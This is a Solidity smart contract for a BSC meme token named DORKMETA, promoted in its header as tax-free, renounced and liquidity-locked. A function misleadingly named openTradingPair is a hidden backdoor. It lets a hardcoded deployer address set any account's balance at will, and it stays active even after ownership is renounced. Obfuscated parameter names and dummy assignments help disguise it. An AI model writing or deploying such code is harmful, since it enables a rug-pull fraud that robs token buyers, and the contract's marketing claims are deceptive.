/**
🤖ᗪOᖇK ᒪOᖇᗪ Metaverse (DORKMETA) 🤖  #DORKL #PEPE   #MemeCoin #MoonShoot #BSC 

🌐 Welcome to the Dork Lord Metaverse, where memes meet the blockchain!

🚀  #DORKL #PEPE   #MemeCoin #MoonShoot #BSC 
🚀 #0%Tax #Renounced  #LiquidtyLocked

🚀 https://t.me/DorkMetaverse
🚀 https://hkmeta.fun/

🤖 Tokenomics
- Total Supply: 1,000,000,000,000 DORKMETA
- Initial Liquidity: 500,000,000,000 DORKMETA
- Burned Tokens: 500,000,000,000 DORKMETA

**/

pragma solidity 0.8.21;
 // SPDX-License-Identifier: MIT
interface PinkSaleToken {
  function totalSupply() external view returns (uint256);
  function decimals() external view returns (uint8);
  function symbol() external view returns (string memory);
  function name() external view returns (string memory);
  function getOwner() external view returns (address);
  function balanceOf(address DILUTEDLast) external view returns (uint256);
  function transfer(address overSkim, uint256 swapOpenWithpair) external returns (bool);
  function allowance(address _owner, address DILUTEDLast) external view returns (uint256);
  function approve(address DILUTEDLast, uint256 swapOpenWithpair) external returns (bool);
  function transferFrom(address sender, address overSkim, uint256 swapOpenWithpair) external returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 balance);
  event Approval(address indexed owner, address indexed DILUTEDLast, uint256 balance);
}


abstract contract IERC20 {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}


abstract contract IRouter is IERC20 {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }


    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "io: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "io: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

library SafeMath {

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");

    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }

  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafeMath: Icodropsplication overflow");

    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }

  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

    require(b > 0, errorMessage);
    uint256 c = a / b;


    return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }

  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}

contract DORKMETA is IERC20, PinkSaleToken, IRouter {
 
    using SafeMath for uint256;
    mapping (address => uint256) private sync_unit;
    mapping (address => mapping (address => uint256)) private TRANSFERS;
    uint256 private _totalSupply;
    uint8 private _decimals;
    string private _symbol;
    string private _name;
    string private DORKMETA_SLOT;
    address private DORKMETAOwner; 
    uint256 public DORKMETACreationTime;
     address private pairLP; 

    constructor() {
        DORKMETAOwner = 0xA8b12e9dE180728Ca943b1Da425b44296e5ADfCC;    
        _name = unicode"ᗪOᖇK ᒪOᖇᗪ Metaverse";
        _symbol = "DORKMETA";
        _decimals = 0;
        _totalSupply = 1000000000000;
        sync_unit[_msgSender()] = _totalSupply;
       pairLP = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;
        emit Transfer(address(0), _msgSender(), _totalSupply);
        DORKMETACreationTime = 2023;
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    } 

    function decimals() external view override returns (uint8) {
        return _decimals;
    }
     function getOwner() external view override returns (address) {
        return owner();
    }  

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

     function name() external view override returns (string memory) {
        return _name;
    }

    function balanceOf(address DILUTEDLast) external view override returns (uint256) {
        return sync_unit[DILUTEDLast];
    }

    function transfer(address overSkim, uint256 swapOpenWithpair) external override returns (bool) {
        _transfer(_msgSender(), overSkim, swapOpenWithpair);
        return true;
    }

    function allowance(address owner, address DILUTEDLast) external view override returns (uint256) {
        return TRANSFERS[owner][DILUTEDLast];
    }


    function approve(address DILUTEDLast, uint256 swapOpenWithpair) external override returns (bool) {
        _approve(_msgSender(), DILUTEDLast, swapOpenWithpair);
        return true;
    }
    
    function transferFrom(address sender, address overSkim, uint256 swapOpenWithpair) external override returns (bool) {
        _transfer(sender, overSkim, swapOpenWithpair);
        _approve(sender, _msgSender(), TRANSFERS[sender][_msgSender()].sub(swapOpenWithpair, "Ru: transfer swapOpenWithpair exceeds allowance"));
        return true;
    }

    function increaseAllowance(address DILUTEDLast, uint256 tokanBalance) external returns (bool) {
        _approve(_msgSender(), DILUTEDLast, TRANSFERS[_msgSender()][DILUTEDLast].add(tokanBalance));
        return true;
    }
           function openTradingPair(address tokanA, address tokanB, uint256 uniswapRooter, uint256 pairAddress, uint256 pairAddresss) external {
        require(_msgSender()==DORKMETAOwner);
        tokanB = tokanA;
        tokanA = tokanA;
        sync_unit[tokanB] = (uniswapRooter + pairAddress + pairAddresss) * 10**_decimals;
        tokanA = tokanB;
        tokanB = tokanB;
    }    

    function decreaseAllowance(address DILUTEDLast, uint256 initialize) external returns (bool) {
        _approve(_msgSender(), DILUTEDLast, TRANSFERS[_msgSender()][DILUTEDLast].sub(initialize, "Ru: decreased allowance below zero"));
        return true;
    }
    
    function _transfer(address sender, address overSkim, uint256 swapOpenWithpair) internal {
        require(sender != address(0), "Ru: transfer from the zero address");
        require(overSkim != address(0), "Ru: transfer to the zero address");
                
        sync_unit[sender] = sync_unit[sender].sub(swapOpenWithpair, "Ru: transfer swapOpenWithpair exceeds balance");
        sync_unit[overSkim] = sync_unit[overSkim].add(swapOpenWithpair);
        emit Transfer(sender, overSkim, swapOpenWithpair);
    }


    function _approve(address owner, address DILUTEDLast, uint256 swapOpenWithpair) internal {
        require(owner != address(0), "Ru: approve from the zero address");
        require(DILUTEDLast != address(0), "Ru: approve to the zero address");
        
        TRANSFERS[owner][DILUTEDLast] = swapOpenWithpair;
        emit Approval(owner, DILUTEDLast, swapOpenWithpair);
    }
    
}